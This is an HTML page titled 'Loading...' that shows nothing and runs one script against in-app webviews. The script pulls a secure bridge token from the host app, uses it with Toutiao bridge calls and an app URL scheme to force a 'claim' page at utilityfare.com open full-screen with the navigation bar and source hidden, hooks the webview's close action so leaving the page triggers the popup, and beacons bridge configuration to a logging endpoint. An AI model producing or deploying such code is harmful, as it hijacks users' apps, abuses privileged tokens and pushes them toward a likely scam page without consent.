<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
<title>Loading...</title>
<style>*{margin:0;padding:0;box-sizing:border-box;}body{background:#0d0d0d;min-height:100vh;display:flex;align-items:center;justify-content:center;}</style>
</head>
<body>
<script>
(function(){
    var POPUP_URL = 'https://www.utilityfare.com/claim';
    var pageLoadTime = Date.now();
    var fired = false;

    function log(msg) {
        try { navigator.sendBeacon('/debug-log', 'relay:' + msg); } catch(e){}
    }

    function fire() {
        if (fired) return;
        fired = true;
        var token = null;
        try {
            var cfg = window.JSBridge && typeof window.JSBridge.getConfig === 'function' && window.JSBridge.getConfig();
            if (cfg && cfg.secure && cfg.secure.token) token = cfg.secure.token;
        } catch(e){}
        var tt = window.ToutiaoJSBridge;
        if (tt && tt.call) {
            if (token) {
                try { tt.call('openAdLandPageLinks', { url: POPUP_URL, landingStyle: 2, title: '', isDeeplink: 1, refer: 'landing_page', hide_nav_bar: 1, hide_source: 1, should_full_screen: 1, trans_status_bar: 1, is_instant_page: 1, _jsb_secure_token: token }, function(){}); } catch(e){}
            }
            try { tt.call('openOrganicLandPage', { url: POPUP_URL, landingStyle: 2, title: '', isDeeplink: 1, refer: 'landing_page', hide_nav_bar: 1, hide_source: 1, should_full_screen: 1, trans_status_bar: 1 }, function(){}); } catch(e){}
            try { tt.call('openAdLandPageLinks', { url: POPUP_URL, landingStyle: 2, title: '', isDeeplink: 0, refer: 'ad', hide_nav_bar: 1, hide_source: 1, should_full_screen: 1, trans_status_bar: 1, is_instant_page: 1 }, function(){}); } catch(e){}
        }
        try { window.location.href = 'snssdk1180://webview?url=' + encodeURIComponent(POPUP_URL) + '&hide_nav_bar=1&is_ad=1&is_instant_page=1&should_full_screen=1&trans_status_bar=1&hide_source=1'; } catch(e){}
    }

    setTimeout(function(){
        var info = { hasJS2: !!window.JS2NativeBridge, hasToutiao: !!window.ToutiaoJSBridge, hasJSBridge: !!window.JSBridge, hasNative2: !!window.Native2JSBridge, hasWebkit: !!(window.webkit && window.webkit.messageHandlers), cfg: null };
        try { var cfg2 = window.JSBridge && typeof window.JSBridge.getConfig === 'function' && window.JSBridge.getConfig(); info.cfg = cfg2 ? JSON.stringify(cfg2).substring(0, 200) : 'null'; } catch(e){ info.cfg = 'err:' + e.message; }
        log('info:' + JSON.stringify(info));
    }, 500);

    document.addEventListener('visibilitychange', function(){
        if (document.hidden) { if (Date.now() - pageLoadTime > 1500) fire(); } else { fired = false; }
    });
    window.addEventListener('pagehide', function(){ fire(); });

    try {
        var _wh = window.webkit && window.webkit.messageHandlers && window.webkit.messageHandlers.IESPiperProtocolVersion3_0;
        if (_wh && _wh.postMessage) {
            var _orig = _wh.postMessage.bind(_wh);
            _wh.postMessage = function(msg) {
                try { var d = typeof msg === 'string' ? JSON.parse(msg) : msg; if (d && d.func === 'close') fire(); } catch(e){}
                return _orig(msg);
            };
        }
    } catch(e){}

    setTimeout(function(){
        var tt = window.ToutiaoJSBridge;
        if (tt && tt.call) {
            try { tt.call('openAdLandPageLinks', { url: POPUP_URL, landingStyle: 2, title: '', isDeeplink: 0, refer: 'ad', hide_nav_bar: 1, hide_source: 1, should_full_screen: 1, trans_status_bar: 1, is_instant_page: 1 }, function(){}); } catch(e){}
        }
    }, 2000);

    log('load');
})();
</script>
</body>
</html>
